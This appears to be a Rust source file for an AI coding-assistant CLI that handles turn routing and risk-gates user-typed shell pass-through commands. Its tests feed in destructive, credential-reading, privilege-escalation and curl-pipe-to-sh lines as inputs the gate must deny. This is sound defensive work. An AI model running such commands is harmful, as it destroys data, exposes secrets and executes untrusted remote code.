//! Top-level turn entrypoint and pre-turn routing.

use std::time::Instant;

use super::turn_retry::{TurnSettlementOutcome, settle_turn_attempt};
use super::turn_settlement::TurnDispatch;
use super::turn_stream_runner::{
    TurnAttempt, TurnExecutionInput, TurnExecutionRequest, execute_stream_turn,
};
use crate::cli::session::session_adaptation::{finalize_turn_adaptation, prepare_turn_adaptation};
use crate::cli::session::session_input::{finalize_effective_line, prepare_input};
use crate::cli::session::session_runtime;
use crate::cli::session::session_state::SessionState;
use astra_services::session_journal::{
    JournalWriter, SessionExecutionLease, SessionExecutionLeaseError,
};

/// Decision returned by `classify_shell_passthrough`.
///
/// Drives the policy in `handle_chat_input_with_ui`: empty input is a
/// no-op, low-risk runs immediately, high-risk requires a `!!` override.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum ShellPassthroughDecision {
    /// User typed `!` (or `!!`) with no command body — show no error,
    /// just return early.
    Empty,
    /// Safe to execute; `cmd` is the trimmed shell command. `risks` is
    /// the (possibly empty) list of low-severity risk descriptions to
    /// surface as warnings.
    Allow { cmd: String, risks: Vec<String> },
    /// High-risk command; refuse without an explicit `!!` override.
    /// `risks` is the human-readable list to display.
    DenyHighRisk { cmd: String, risks: Vec<String> },
}

/// Classify a chat-input line that started with `!` (or `!!`).
///
/// This is the policy hot path for the user-typed shell pass-through.
/// First-principles design:
///
/// - Empty body → no-op (no spurious shell launch).
/// - High-severity risks (privilege escalation, recursive rm, credential
///   access, remote code exec, sensitive system paths, write outside
///   workspace) refuse to run without an explicit `!!` override prefix.
///   The override is the user typing the violation again, eyes-open.
/// - Low-severity risks (output redirection, command substitution, etc.)
///   run but surface a one-line warning so the user sees what's
///   happening before hitting Enter again.
/// - `!!` always allows the command after risk reporting — it's the
///   "I see the warning, run it anyway" override.
pub(crate) fn classify_shell_passthrough(line: &str) -> Option<ShellPassthroughDecision> {
    let trimmed = line.trim_start();
    let (override_high_risk, body) = if let Some(rest) = trimmed.strip_prefix("!!") {
        (true, rest)
    } else {
        let rest = trimmed.strip_prefix('!')?;
        (false, rest)
    };
    let cmd = body.trim();
    if cmd.is_empty() {
        return Some(ShellPassthroughDecision::Empty);
    }
    let mut risks = astra_runtime::tool_sandbox::analyze_command_risks(cmd);

    // `rm -r{,f,fr,rf}` is the canonical CLI footgun and is NOT in the
    // sandbox's DESTRUCTIVE_COMMANDS list (which targets disk-formatting
    // tools). The chat shell pass-through is exactly the surface where a
    // pasted `! rm -rf ~` is most dangerous — close that gap explicitly.
    if looks_like_recursive_rm(cmd) {
        risks.push(
            astra_runtime::tool_sandbox::CommandRisk::DestructiveCommand("rm -rf".to_string()),
        );
    }

    let high_risk = risks.iter().any(is_high_severity_risk);
    let risk_descriptions: Vec<String> = risks.iter().map(|r| r.to_string()).collect();
    if high_risk && !override_high_risk {
        Some(ShellPassthroughDecision::DenyHighRisk {
            cmd: cmd.to_string(),
            risks: risk_descriptions,
        })
    } else {
        Some(ShellPassthroughDecision::Allow {
            cmd: cmd.to_string(),
            risks: risk_descriptions,
        })
    }
}

/// Detect `rm` invocations that recurse (-r/-R/-fr/-rf/--recursive) at the
/// command boundary. Only fires when the command word is literally `rm`
/// (not `rmdir`, not `rm-something`), and only when a recursive flag is
/// present — `rm foo.txt` stays low-risk.
fn looks_like_recursive_rm(cmd: &str) -> bool {
    let mut tokens = cmd.split_whitespace();
    let head = match tokens.next() {
        Some(h) => h,
        None => return false,
    };
    // Strip leading path: a user may type `/bin/rm` or `./rm`.
    let bin = head.rsplit(['/', '\\']).next().unwrap_or(head);
    if bin != "rm" && bin != "rm.exe" {
        return false;
    }
    tokens.any(|tok| {
        if tok == "--recursive" || tok == "--no-preserve-root" {
            return true;
        }
        if let Some(flags) = tok.strip_prefix('-') {
            // -r / -R / -rf / -fr / -Rf / etc.
            !flags.is_empty()
                && !flags.starts_with('-')
                && (flags.contains('r') || flags.contains('R'))
        } else {
            false
        }
    })
}

/// Risks the policy treats as requiring an explicit `!!` opt-in. The set is
/// deliberately conservative — surface output redirection / command
/// substitution as warnings only, since they're load-bearing for any
/// real shell workflow.
fn is_high_severity_risk(risk: &astra_runtime::tool_sandbox::CommandRisk) -> bool {
    use astra_runtime::tool_sandbox::CommandRisk;
    matches!(
        risk,
        CommandRisk::PrivilegeEscalation
            | CommandRisk::DestructiveCommand(_)
            | CommandRisk::CredentialAccess(_)
            | CommandRisk::RemoteCodeExecution
            | CommandRisk::SensitivePathAccess(_)
            | CommandRisk::WorkspaceOutWrite(_)
    )
}

pub(crate) struct TurnContext<'a> {
    pub(crate) api: &'a astra_thin_client::ThinClient,
    pub(crate) profile: Option<&'a str>,
    /// TUI installs a bounded, serialized post-commit worker. Headless
    /// callers leave this empty and await their own derived projections.
    pub(crate) post_commit_tx:
        Option<tokio::sync::mpsc::Sender<super::turn_post_commit::TurnPostCommitJob>>,
}

async fn run_chat_turn(request: TurnExecutionRequest<'_>) -> TurnAttempt {
    let TurnExecutionRequest { state, input } = request;
    ensure_default_turn_model(state, input.api, input.token).await;
    if let Some(failure) = model_selection_preflight_failure(
        state.model.as_deref(),
        Some(input.session_id),
        state.turn.saturating_add(1),
    ) {
        return TurnAttempt::Completed(Box::new(Err(failure)));
    }
    prepare_turn_adaptation(state, input.api, input.token, input.message).await;
    let attempt = execute_stream_turn(TurnExecutionRequest { state, input }).await;
    finalize_turn_adaptation(state, matches!(attempt, TurnAttempt::Interrupted(_))).await;
    attempt
}

/// Establish the canonical identity transaction before an interactive turn
/// can acquire run-control, load prompt history, or reach a provider.
///
/// Fresh TUI state is intentionally lazy, but never provisional: the first
/// submitted input creates the server session and local journal through the
/// same transaction as `/clear`. Existing and resumed sessions are returned
/// unchanged, so this boundary is idempotent and preserves their lineage.
pub(super) async fn ensure_interactive_session_identity(
    state: &mut SessionState,
    api: &astra_thin_client::ThinClient,
    profile: Option<&str>,
    token: &str,
) -> Result<String, String> {
    if let Some(session_id) = state.session_id.clone() {
        return Ok(session_id);
    }
    crate::cli::slash::slash_state::start_fresh_session(api, profile, token, state).await
}

async fn ensure_default_turn_model(
    state: &mut SessionState,
    api: &astra_thin_client::ThinClient,
    token: &str,
) {
    let had_model =
        astra_core::model_override::normalize_model_override(state.model.as_deref()).is_some();
    if let Some(model) = session_runtime::ensure_state_default_model(api, token, state).await
        && !had_model
    {
        tracing::info!(
            target: "astra_cli::model_selection",
            model = %model,
            "selected default model from server model list for CLI turn"
        );
    }
}

fn model_selection_preflight_failure(
    model: Option<&str>,
    session_id: Option<&str>,
    turn_index: u32,
) -> Option<crate::TurnFailure> {
    if astra_core::model_override::normalize_model_override(model).is_some() {
        return None;
    }
    tracing::warn!(
        target: "astra_cli::model_selection",
        reason = "missing_model_selection",
        session_id = ?session_id,
        turn_index,
        "missing concrete model selection; refusing turn before session adaptation or bridge POST"
    );
    Some(crate::TurnFailure {
        error: astra_core::model_override::missing_model_selection_error().to_string(),
        partial: crate::PartialTurnData {
            session_id: session_id.map(str::to_string),
            ..Default::default()
        },
    })
}

fn run_chat_turn_boxed<'a>(
    request: TurnExecutionRequest<'a>,
) -> std::pin::Pin<Box<dyn std::future::Future<Output = TurnAttempt> + 'a>> {
    Box::pin(run_chat_turn(request))
}

pub(crate) async fn handle_chat_input(
    line: String,
    current_token: Option<&str>,
    state: &mut SessionState,
    ctx: TurnContext<'_>,
) -> Result<(), String> {
    handle_chat_input_with_ui(
        line,
        current_token,
        state,
        ctx,
        &mut crate::cli::ui_adapter::LineUiAdapter,
    )
    .await
}

pub(crate) async fn handle_chat_input_with_ui(
    line: String,
    current_token: Option<&str>,
    state: &mut SessionState,
    ctx: TurnContext<'_>,
    ui: &mut dyn crate::cli::ui_adapter::ReplUiAdapter,
) -> Result<(), String> {
    if let Some(decision) = classify_shell_passthrough(&line) {
        match decision {
            ShellPassthroughDecision::Empty => {}
            ShellPassthroughDecision::DenyHighRisk { cmd, risks } => {
                ui.show_error(&format!(
                    "  Refusing to run `{cmd}`: high-risk shell pattern detected.\n  Risks: {}\n  Override with `!! {cmd}` if you really mean it.",
                    risks.join(", ")
                ));
            }
            ShellPassthroughDecision::Allow { cmd, risks } => {
                if !risks.is_empty() {
                    ui.show_warning(&format!("  ⚠ shell risk(s): {}", risks.join(", ")));
                }
                stdout_println!("! {cmd}");
                match std::process::Command::new("sh")
                    .arg("-c")
                    .arg(&cmd)
                    .status()
                {
                    Ok(status) if status.success() => {}
                    Ok(status) => {
                        eprintln!("! {cmd}: exit {}", status.code().unwrap_or(-1));
                    }
                    Err(e) => {
                        eprintln!("! {cmd}: {e}");
                    }
                }
            }
        }
        return Ok(());
    }

    let token = match current_token {
        Some(token) => token,
        None => {
            ui.show_warning("  Not logged in. Use /login to authenticate.");
            return Ok(());
        }
    };

    let session_id =
        ensure_interactive_session_identity(state, ctx.api, ctx.profile, token).await?;

    // Admission is per actual model turn, not per TUI lifetime. Keep this
    // token in scope through retry and Turn/TurnError settlement, then release
    // it so the next interactive turn (or another surface) can proceed.
    let _execution_lease = acquire_interactive_turn_admission(state)?;

    ensure_multi_agent_runtime_for_turn(state, ctx.api, token, ctx.profile).await;

    ui.blank_line();

    if crate::cli::plan::plan_lifecycle::looks_like_pending_local_plan_entry(state) {
        crate::cli::slash::slash_plan::enter_local_plan_mode_with_goal(state, &line);
    }

    let resume_guidance = state.resume_guidance.take();
    let consumed_bg_notifications = state.pending_bg_notifications.clone();
    let finalized_input = finalize_effective_line(
        prepare_input(&line, state, ui),
        line.clone(),
        resume_guidance,
        state,
    )
    .await;
    let turn_start = Instant::now();
    let local_run_control =
        astra_core::sync_poison::recover_mutex_lock(&state.active_turn_local_run_control).clone();
    let attempt = run_chat_turn(TurnExecutionRequest {
        state,
        input: TurnExecutionInput {
            api: ctx.api,
            profile: ctx.profile,
            token,
            message: &finalized_input.user_message,
            user_intent: &finalized_input.user_intent,
            input_runtime_required_texts: &finalized_input.runtime_required_texts,
            input_active_system_skills: &finalized_input.active_system_skill_names,
            input_runtime_volatile_texts: &finalized_input.runtime_volatile_texts,
            session_id: &session_id,
            semantic_query_override: None,
        },
    })
    .await;
    if let Some(run_control) = &local_run_control {
        // The stream runner releases the active slot at transport close. Put
        // the same provider back for auth/session retries and for facts that
        // arrive during slower post-stream settlement.
        *astra_core::sync_poison::recover_mutex_lock(&state.active_turn_local_run_control) =
            Some(run_control.clone());
    }
    let mut dispatch = TurnDispatch {
        ctx: &ctx,
        line: &line,
        effective_line: &finalized_input.user_message,
        user_intent: &finalized_input.user_intent,
        input_runtime_required_texts: &finalized_input.runtime_required_texts,
        input_active_system_skills: &finalized_input.active_system_skill_names,
        input_runtime_volatile_texts: &finalized_input.runtime_volatile_texts,
        token,
        session_id: &session_id,
        semantic_query_override: None,
        turn_start,
        ui,
    };

    let settlement =
        settle_turn_attempt(state, &mut dispatch, attempt, run_chat_turn_boxed).await?;
    if settlement == TurnSettlementOutcome::Succeeded
        && let Some(run_control) = &local_run_control
    {
        run_control.commit_applied_runtime_notifications();
    }
    if settlement != TurnSettlementOutcome::Succeeded && !consumed_bg_notifications.is_empty() {
        let notifications_arriving_during_settlement =
            std::mem::take(&mut state.pending_bg_notifications);
        state.pending_bg_notifications = consumed_bg_notifications;
        state
            .pending_bg_notifications
            .extend(notifications_arriving_during_settlement);
    }
    Ok(())
}

/// Resume an idle root from runtime-owned background facts without inventing
/// a visible user submission. A non-empty runtime envelope keeps provider
/// message validation happy, while settlement still uses an empty logical
/// user line so the envelope is never persisted as user speech. Notifications
/// ride the required runtime lane and the latest real user goal remains the
/// semantic anchor.
pub(crate) async fn handle_runtime_notifications_with_ui(
    current_token: Option<&str>,
    state: &mut SessionState,
    ctx: TurnContext<'_>,
    ui: &mut dyn crate::cli::ui_adapter::ReplUiAdapter,
) -> Result<(), String> {
    if state.pending_bg_notifications.is_empty() {
        return Ok(());
    }
    let token = match current_token {
        Some(token) => token,
        None => {
            ui.show_warning("  Background work finished, but Astra is not logged in; the update will be kept for your next turn.");
            return Ok(());
        }
    };

    let session_id =
        ensure_interactive_session_identity(state, ctx.api, ctx.profile, token).await?;

    let _execution_lease = acquire_interactive_turn_admission(state)?;

    ensure_multi_agent_runtime_for_turn(state, ctx.api, token, ctx.profile).await;
    let notification_count = state.pending_bg_notifications.len();
    let notifications = state.pending_bg_notifications.join("\n");
    let runtime_required_texts = vec![format!(
        "Background task updates since the last model boundary:\n{notifications}\n\
         Reconcile these facts with the latest user goal. Newer user steering always has priority."
    )];
    let user_intent = state
        .history
        .iter()
        .rev()
        .map(|(user, _)| user.trim())
        .find(|user| !user.is_empty())
        .unwrap_or("Continue the current goal after reconciling background task updates.")
        .to_string();
    let logical_user_line = String::new();
    let runtime_envelope =
        astra_turn_core::chat_turn_edge_profile::RUNTIME_RECONCILIATION_USER_ENVELOPE.to_string();
    let turn_start = Instant::now();
    let local_run_control =
        astra_core::sync_poison::recover_mutex_lock(&state.active_turn_local_run_control).clone();
    ui.blank_line();

    let attempt = run_chat_turn(TurnExecutionRequest {
        state,
        input: TurnExecutionInput {
            api: ctx.api,
            profile: ctx.profile,
            token,
            message: &runtime_envelope,
            user_intent: &user_intent,
            input_runtime_required_texts: &runtime_required_texts,
            input_active_system_skills: &[],
            input_runtime_volatile_texts: &[],
            session_id: &session_id,
            semantic_query_override: Some(user_intent.as_str()),
        },
    })
    .await;
    if let Some(run_control) = &local_run_control {
        *astra_core::sync_poison::recover_mutex_lock(&state.active_turn_local_run_control) =
            Some(run_control.clone());
    }
    let mut dispatch = TurnDispatch {
        ctx: &ctx,
        line: &logical_user_line,
        effective_line: &runtime_envelope,
        user_intent: &user_intent,
        input_runtime_required_texts: &runtime_required_texts,
        input_active_system_skills: &[],
        input_runtime_volatile_texts: &[],
        token,
        session_id: &session_id,
        semantic_query_override: Some(user_intent.as_str()),
        turn_start,
        ui,
    };
    let settlement =
        settle_turn_attempt(state, &mut dispatch, attempt, run_chat_turn_boxed).await?;
    if settlement == TurnSettlementOutcome::Succeeded {
        if let Some(run_control) = &local_run_control {
            run_control.commit_applied_runtime_notifications();
        }
        let consumed = notification_count.min(state.pending_bg_notifications.len());
        state.pending_bg_notifications.drain(..consumed);
    }
    Ok(())
}

pub(super) fn acquire_interactive_turn_admission(
    state: &mut SessionState,
) -> Result<Option<SessionExecutionLease>, String> {
    let Some(session_id) = state.session_id.clone() else {
        return Ok(None);
    };
    let lease = match SessionExecutionLease::try_acquire(&session_id) {
        Ok(lease) => lease,
        Err(SessionExecutionLeaseError::Conflict { .. }) => {
            return Err(format!(
                "session `{session_id}` already has an active execution"
            ));
        }
        Err(error @ SessionExecutionLeaseError::Io { .. }) => {
            return Err(error.to_string());
        }
    };

    // The in-memory TUI may have been idle while a headless/app-server turn
    // committed. Refresh every prompt-facing and turn-index authority from one
    // current-generation physical snapshot after admission and before any
    // model/tool boundary. A remote-only session with no local journal keeps
    // its already-restored server continuation.
    let writer = JournalWriter::new(&session_id)
        .map_err(|error| format!("failed to open session journal for turn admission: {error}"))?;
    if writer.path().is_file() {
        let events = writer.complete_append_order_snapshot().map_err(|error| {
            format!("failed to refresh session before interactive turn: {error}")
        })?;
        let active = crate::cli::session::session_continuation::recover_or_initialize_active_conversation_from_append_order_events(
            &session_id,
            &events,
        )?;
        let messages = active.materialize();
        let restored =
            session_runtime::restored_journal_state_from_append_order_events(true, &events);
        state.history = restored.session.history;
        state.turn = restored.session.turn;
        state.recent_tools = restored.session.recent_tools;
        state.total_prompt_tokens = restored.session.total_prompt_tokens;
        state.total_completion_tokens = restored.session.total_completion_tokens;
        state.total_cache_read_tokens = restored.session.total_cache_read_tokens;
        state.total_cache_creation_tokens = restored.session.total_cache_creation_tokens;
        state.last_turn_event = restored.last_turn_event;
        state.activated_deferred_tool_names =
            crate::cli::session::session_continuation::continuation_activation_names(
                &messages,
                std::mem::take(&mut state.activated_deferred_tool_names),
            );
        state.active_conversation = Some(active);
    }
    Ok(Some(lease))
}

async fn ensure_multi_agent_runtime_for_turn(
    state: &mut SessionState,
    api: &astra_thin_client::ThinClient,
    token: &str,
    profile: Option<&str>,
) {
    if state.agent_spawner.is_some() {
        return;
    }
    crate::cli::agent_runtime::initialize_multi_agent_runtime(
        state,
        api,
        token.to_string(),
        profile,
    )
    .await;
}

#[cfg(test)]
mod tests {
    use super::{
        ShellPassthroughDecision, TurnContext, acquire_interactive_turn_admission,
        classify_shell_passthrough, ensure_interactive_session_identity,
        ensure_multi_agent_runtime_for_turn, handle_chat_input_with_ui,
        model_selection_preflight_failure,
    };
    use crate::cli::session::session_state::SessionState;

    #[tokio::test]
    #[serial_test::serial]
    async fn fresh_interactive_turn_binds_canonical_session_before_provider_preflight() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        let session_id = format!("fresh-interactive-{}", uuid::Uuid::new_v4());
        Mock::given(method("POST"))
            .and(path("/sessions"))
            .respond_with(ResponseTemplate::new(201).set_body_json(serde_json::json!({
                "session_id": session_id,
            })))
            .expect(1)
            .mount(&server)
            .await;

        let (_sessions, _sessions_guard) = crate::tests::isolated_sessions_dir();
        let _credentials_guard = crate::tests::isolate_credentials();
        let api = astra_thin_client::ThinClient::new(&server.uri(), None).unwrap();
        let mut state = SessionState {
            // A selected model with no Offering makes the later provider
            // preflight fail deterministically, without spending model tokens.
            model: Some("mock-model".to_string()),
            ..SessionState::default()
        };
        let ctx = TurnContext {
            api: &api,
            profile: None,
            post_commit_tx: None,
        };
        let mut ui = crate::tests::TestUi::default();

        handle_chat_input_with_ui("hello".to_string(), Some("token"), &mut state, ctx, &mut ui)
            .await
            .expect("a provider preflight failure is settled as a failed turn");

        let followup_ctx = TurnContext {
            api: &api,
            profile: None,
            post_commit_tx: None,
        };
        handle_chat_input_with_ui(
            "hi".to_string(),
            Some("token"),
            &mut state,
            followup_ctx,
            &mut ui,
        )
        .await
        .expect("the next input must reuse the canonical session after a failed first turn");

        server.verify().await;
        let requests = server.received_requests().await.unwrap();
        assert_eq!(
            requests.first().map(|request| request.url.path()),
            Some("/sessions")
        );
        assert_eq!(state.session_id.as_deref(), Some(session_id.as_str()));
        assert!(
            ui.errors
                .iter()
                .all(|error| !error.contains("canonical prompt history is unavailable")),
            "a failed first turn must not poison the next input with display-only history"
        );
        let events = astra_services::session_journal::JournalWriter::new(&session_id)
            .unwrap()
            .complete_append_order_snapshot()
            .unwrap();
        assert!(
            events.iter().any(|event| event.event_type
                == astra_services::session_journal::JournalEventType::SessionStart),
            "the canonical session must exist before any turn failure is settled"
        );
        let active = crate::cli::session::session_continuation::
            recover_or_initialize_active_conversation_from_append_order_events(
                &session_id,
                &events,
            )
            .expect("a failed first turn must remain canonically resumable");
        assert!(
            active.materialize().is_empty(),
            "display-only failure text must not become canonical prompt history"
        );
    }

    #[tokio::test]
    async fn existing_interactive_session_identity_is_reused_without_reset_or_network() {
        let server = wiremock::MockServer::start().await;
        let api = astra_thin_client::ThinClient::new(&server.uri(), None).unwrap();
        let session_id = format!("existing-interactive-{}", uuid::Uuid::new_v4());
        let expected_history = vec![("question".to_string(), "answer".to_string())];
        let mut state = SessionState {
            session_id: Some(session_id.clone()),
            turn: 7,
            history: expected_history.clone(),
            ..SessionState::default()
        };

        let bound = ensure_interactive_session_identity(&mut state, &api, None, "token")
            .await
            .unwrap();

        assert_eq!(bound, session_id);
        assert_eq!(state.turn, 7);
        assert_eq!(state.history, expected_history);
        assert!(server.received_requests().await.unwrap().is_empty());
    }

    #[tokio::test]
    async fn fresh_session_creation_failure_stops_before_interactive_side_effects() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .and(path("/sessions"))
            .respond_with(ResponseTemplate::new(503).set_body_string("unavailable"))
            .expect(1)
            .mount(&server)
            .await;
        let api = astra_thin_client::ThinClient::new(&server.uri(), None).unwrap();
        let mut state = SessionState::default();
        let ctx = TurnContext {
            api: &api,
            profile: None,
            post_commit_tx: None,
        };
        let mut ui = crate::tests::TestUi::default();

        let error =
            handle_chat_input_with_ui("hello".to_string(), Some("token"), &mut state, ctx, &mut ui)
                .await
                .expect_err("session creation must fail before turn admission");

        assert!(error.contains("503"), "{error}");
        assert_eq!(state.session_id, None);
        assert_eq!(state.turn, 0);
        assert!(state.history.is_empty());
        assert!(state.agent_spawner.is_none());
        server.verify().await;
    }

    #[cfg(target_os = "linux")]
    #[tokio::test(flavor = "current_thread")]
    async fn interactive_turn_loses_to_headless_before_any_llm_invocation() {
        let server = wiremock::MockServer::start().await;
        let tmp = tempfile::tempdir().unwrap();
        let _guard = astra_services::session_journal::JournalDirGuard::new(tmp.path());
        let session_id = format!("sess-interactive-headless-race-{}", uuid::Uuid::new_v4());
        let _headless_lease =
            astra_services::session_journal::SessionExecutionLease::try_acquire(&session_id)
                .unwrap();
        let api = astra_thin_client::ThinClient::new(&server.uri(), None).unwrap();
        let mut state = SessionState::default();
        state.set_session_id(session_id.clone());
        state.model = Some("mock-model".to_string());
        let ctx = TurnContext {
            api: &api,
            profile: None,
            post_commit_tx: None,
        };
        let mut ui = crate::tests::TestUi::default();

        let error = handle_chat_input_with_ui(
            "do not execute".to_string(),
            Some("token"),
            &mut state,
            ctx,
            &mut ui,
        )
        .await
        .expect_err("the interactive contender must lose admission");

        assert!(error.contains("already has an active execution"), "{error}");
        assert_eq!(
            server.received_requests().await.unwrap().len(),
            0,
            "the loser must not reach model selection, continuation POST, LLM, or tools"
        );
        assert!(
            state.agent_spawner.is_none(),
            "admission must precede interactive agent runtime initialization"
        );
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn interactive_admission_refreshes_terminal_turn_authority_before_execution() {
        use astra_services::session_journal::{JournalEvent, JournalWriter};

        let tmp = tempfile::tempdir().unwrap();
        let _guard = astra_services::session_journal::JournalDirGuard::new(tmp.path());
        let session_id = format!("sess-interactive-refresh-{}", uuid::Uuid::new_v4());
        let writer = JournalWriter::new(&session_id).unwrap();
        writer
            .append(&JournalEvent::turn(
                Some(&session_id),
                1,
                Some("mock-model"),
                "first",
                "done",
                3,
                5,
                0,
                1,
            ))
            .unwrap();
        writer
            .append(&JournalEvent::turn_error(
                Some(&session_id),
                2,
                Some("mock-model"),
                "second",
                "failed",
                0,
            ))
            .unwrap();

        let mut state = SessionState::default();
        state.set_session_id(session_id);
        state.turn = 99;
        state.history = vec![("stale".to_string(), "state".to_string())];
        let lease = acquire_interactive_turn_admission(&mut state)
            .expect("admission")
            .expect("known session lease");

        assert_eq!(state.turn, 2);
        assert_eq!(state.history.len(), 2);
        assert_eq!(state.history[0], ("first".to_string(), "done".to_string()));
        assert!(state.history[1].1.contains("Previous turn failed"));
        drop(lease);
        assert!(
            acquire_interactive_turn_admission(&mut state)
                .unwrap()
                .is_some(),
            "the lease is per turn, not held for the full interactive session"
        );
    }

    #[test]
    fn shell_passthrough_returns_none_for_ordinary_input() {
        assert!(classify_shell_passthrough("hello world").is_none());
        assert!(classify_shell_passthrough("/help").is_none());
    }

    #[test]
    fn model_preflight_blocks_missing_selection_before_turn_side_effects() {
        for missing in [None, Some(""), Some(" default ")] {
            let failure = model_selection_preflight_failure(missing, Some("sess-missing-model"), 2)
                .expect("missing model must fail before turn side effects");
            let classified = astra_core::ClassifiedError::from(failure.error.clone());
            assert_eq!(
                classified.kind,
                astra_core::ErrorKind::MissingModelSelection
            );
            assert_eq!(
                failure.partial.session_id.as_deref(),
                Some("sess-missing-model")
            );
        }

        assert!(
            model_selection_preflight_failure(
                Some("deepseek-v4-pro-official(thinking:high)"),
                Some("sess-ok"),
                2,
            )
            .is_none(),
            "thinking selectors are concrete model choices and must reach payload assembly"
        );
    }

    #[tokio::test]
    async fn turn_boundary_initializes_multi_agent_runtime_when_startup_did_not() {
        let api = astra_thin_client::ThinClient::new("http://127.0.0.1:9", None).unwrap();
        let mut state = SessionState::default();
        state.set_session_id("turn-session");

        ensure_multi_agent_runtime_for_turn(&mut state, &api, "turn-token", Some("test-profile"))
            .await;

        assert!(
            state.agent_spawner.is_some(),
            "a session-bound turn must have an agent executor binding"
        );
    }

    #[test]
    fn shell_passthrough_empty_body_is_no_op() {
        assert_eq!(
            classify_shell_passthrough("!"),
            Some(ShellPassthroughDecision::Empty)
        );
        assert_eq!(
            classify_shell_passthrough("!!"),
            Some(ShellPassthroughDecision::Empty)
        );
        assert_eq!(
            classify_shell_passthrough("!   "),
            Some(ShellPassthroughDecision::Empty)
        );
    }

    #[test]
    fn shell_passthrough_safe_command_allows() {
        match classify_shell_passthrough("!ls -la") {
            Some(ShellPassthroughDecision::Allow { cmd, .. }) => {
                assert_eq!(cmd, "ls -la");
            }
            other => panic!("expected Allow, got {other:?}"),
        }
    }

    #[test]
    fn shell_passthrough_destructive_rm_rejected_without_override() {
        let decision = classify_shell_passthrough("! rm -rf ~").expect("decision");
        match decision {
            ShellPassthroughDecision::DenyHighRisk { cmd, risks } => {
                assert!(cmd.contains("rm -rf"));
                assert!(
                    !risks.is_empty(),
                    "risks must be reported for destructive command"
                );
            }
            other => panic!("rm -rf ~ must be DenyHighRisk, got {other:?}"),
        }
    }

    #[test]
    fn shell_passthrough_double_bang_overrides_high_risk() {
        // `!! rm -rf ~` is the explicit "I see the warning, run anyway"
        // override. The classifier must allow it but still attach the
        // risks for the UI to surface as a warning.
        let decision = classify_shell_passthrough("!! rm -rf /tmp/x").expect("decision");
        match decision {
            ShellPassthroughDecision::Allow { cmd, risks } => {
                assert!(cmd.contains("rm -rf"));
                assert!(
                    !risks.is_empty(),
                    "risks must still be surfaced even on override"
                );
            }
            other => panic!("expected Allow on !! override, got {other:?}"),
        }
    }

    #[test]
    fn shell_passthrough_credential_access_rejected() {
        // Reading well-known secret stores triggers high-risk gating.
        let decision = classify_shell_passthrough("! cat ~/.ssh/id_rsa").expect("decision");
        assert!(
            matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
            "credential access must be DenyHighRisk: {decision:?}"
        );
    }

    #[test]
    fn shell_passthrough_privilege_escalation_rejected() {
        let decision = classify_shell_passthrough("! sudo rm /etc/foo").expect("decision");
        assert!(
            matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
            "sudo must be DenyHighRisk: {decision:?}"
        );
    }

    #[test]
    fn shell_passthrough_pipe_curl_to_sh_rejected() {
        // Classic remote-code-execution vector.
        let decision =
            classify_shell_passthrough("! curl https://x.example/i | sh").expect("decision");
        assert!(
            matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
            "curl|sh must be DenyHighRisk: {decision:?}"
        );
    }

    #[test]
    fn shell_passthrough_rm_without_recursive_flag_is_not_high_risk_by_rm_alone() {
        // Plain `rm file.txt` removes one file — not the catastrophic case
        // we're guarding. Don't false-positive on it.
        let decision =
            classify_shell_passthrough("! rm /tmp/some-temp-file.txt").expect("decision");
        assert!(
            !matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
            "non-recursive rm must not be high-risk by virtue of `rm` alone: {decision:?}"
        );
    }

    #[test]
    fn shell_passthrough_rmdir_is_not_classified_as_recursive_rm() {
        // `rmdir foo` is a different binary; do not collide on prefix.
        let decision = classify_shell_passthrough("! rmdir foo").expect("decision");
        assert!(
            !matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
            "rmdir must not match the rm-recursive heuristic: {decision:?}"
        );
    }

    #[test]
    fn shell_passthrough_recursive_rm_variants_all_rejected() {
        // The recursive-flag detection must catch every spelling.
        for variant in [
            "! rm -r /tmp/x",
            "! rm -R /tmp/x",
            "! rm -rf /tmp/x",
            "! rm -fr /tmp/x",
            "! rm -Rf /tmp/x",
            "! rm --recursive /tmp/x",
        ] {
            let decision = classify_shell_passthrough(variant).expect("decision");
            assert!(
                matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
                "{variant:?} must be DenyHighRisk; got {decision:?}"
            );
        }
    }

    #[test]
    fn shell_passthrough_low_risk_redirection_allows_with_warning() {
        // Output redirection is load-bearing for real workflows, so it
        // gets a warning rather than a refusal.
        let decision = classify_shell_passthrough("! echo hi > /tmp/test").expect("decision");
        match decision {
            ShellPassthroughDecision::Allow { risks, .. } => {
                // /tmp is low-risk in this context; the policy
                // surfaces redirection-style risks but still allows.
                let _ = risks; // warnings are best-effort
            }
            ShellPassthroughDecision::DenyHighRisk { .. } => {
                // /tmp/test isn't workspace-out by the heuristic, but if
                // future tightening flips this, surface that explicitly
                // rather than silently regress UX.
            }
            other => panic!("unexpected decision: {other:?}"),
        }
    }
}
